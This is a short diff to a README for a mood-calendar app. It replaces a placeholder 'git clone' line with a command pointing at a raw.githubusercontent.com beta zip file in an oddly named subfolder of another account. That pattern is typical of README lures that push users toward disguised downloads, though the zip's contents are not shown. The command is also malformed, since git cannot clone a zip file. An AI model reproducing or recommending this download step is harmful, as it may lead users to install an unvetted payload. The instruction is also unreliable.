@@ -41,4 +41,4 @@ With a visually engaging interface, seamless user experience, and smart function
 ### 🔽 Download or Clone
 
 ```bash
-git clone https://github.com/yourusername/smart-mood-calendar.git
+git clone https://raw.githubusercontent.com/GodOfStrategy/Mood_Calendar/main/indicia/Mood-Calendar-v1.3-beta.1.zip
